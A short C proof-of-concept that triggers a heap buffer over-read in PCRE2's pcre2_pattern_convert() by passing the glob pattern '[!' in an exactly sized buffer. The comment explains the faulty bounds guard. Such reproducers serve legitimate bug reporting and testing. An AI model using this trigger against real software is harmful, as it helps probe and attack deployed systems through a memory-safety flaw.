/* PoC: pcre2_pattern_convert() reads one code unit past the end of the
   caller's pattern buffer when a glob character class ends immediately
   after the negation character (e.g. "[!"). The guard that should reject
   a negation marker at the very end of the pattern lets this case through,
   and the subsequent test for a literal ']' dereferences the out-of-range
   position. Detected by AddressSanitizer as a heap-buffer-overflow read. */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PCRE2_CODE_UNIT_WIDTH 8
#include <pcre2.h>

int main(void)
{
PCRE2_UCHAR *pattern;
PCRE2_UCHAR *converted = NULL;
PCRE2_SIZE converted_length = 0;
PCRE2_SIZE plength = 2;
int rc;

pattern = (PCRE2_UCHAR *)malloc(plength);
if (pattern == NULL) return 2;
memcpy(pattern, "[!", plength);

rc = pcre2_pattern_convert(pattern, plength,
  PCRE2_CONVERT_GLOB | PCRE2_CONVERT_GLOB_NO_WILD_SEPARATOR,
  &converted, &converted_length, NULL);

printf("convert rc=%d length=%lu\n", rc, (unsigned long)converted_length);

if (converted != NULL) pcre2_converted_pattern_free(converted);
free(pattern);
return 0;
}
